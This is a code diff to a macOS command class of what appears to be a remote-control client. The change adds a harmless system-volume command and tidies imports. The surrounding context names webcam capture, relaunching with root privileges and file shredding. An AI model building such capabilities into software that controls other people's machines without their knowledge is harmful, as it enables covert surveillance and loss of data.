@@ -1,7 +1,6 @@
 import os
 import subprocess
 import sys
-import tempfile
 import time
 
 from client.commands.argument_command_registry import (
@@ -247,13 +246,11 @@ class MacCommands(CommonCommands):
         except Exception as e:
             return 0, f'Webcam capture failed: {e}'
 
-
     @desc('Launch new instance with sudo (macOS)', group='platform')
     @interruptible()
     def sudo_launch(self):
         """以 root 权限启动新实例，返回 PID"""
         import subprocess
-        import os
         from core.utils.client_util import get_executable_path
 
         cmd = get_executable_path()
@@ -315,7 +312,29 @@ class MacCommands(CommonCommands):
         except Exception as e:
             return 0, f'Failed to shred file: {e}'
 
+    @desc('Get/set system volume', group='system')
+    @interruptible()
+    def volume(self, level=None):
+        """获取或设置系统音量 (0-100)"""
+        try:
+            import subprocess
 
+            # 检查是否有参数传入
+            if level is None or level == '':
+                result = subprocess.run(['osascript', '-e', 'output volume of (get volume settings)'],
+                                        capture_output=True, text=True)
+                current = result.stdout.strip()
+                return 1, f'Current volume: {current}'
+            else:
+                level = int(level)
+                if level < 0:
+                    level = 0
+                elif level > 100:
+                    level = 100
+                subprocess.run(['osascript', '-e', f'set volume output volume {level}'], capture_output=True)
+                return 1, f'Volume set to {level}'
+        except Exception as e:
+            return 0, f'Failed: {e}'
 
     @argument_command('msgbox', spec=MSGBOX_ARGUMENT_SPEC)
     def _acmd_msgbox(self, args_dict, payload=None):
@@ -402,7 +421,6 @@ class MacCommands(CommonCommands):
         except Exception as e:
             return 0, f'Query failed: {e}'
 
-
     @argument_command('image_info', spec=IMAGE_INFO_SPEC)
     def _acmd_image_info(self, args_dict, payload=None):
         """获取图片信息"""
@@ -477,7 +495,6 @@ class MacCommands(CommonCommands):
             return 0, 'PIL not installed, install with: pip install Pillow'
         except Exception as e:
             return 0, f'Failed to get image info: {e}'
-
 
     @argument_command('import_check', spec=IMPORT_CHECK_SPEC)
     def _acmd_import_check(self, args_dict, payload=None):
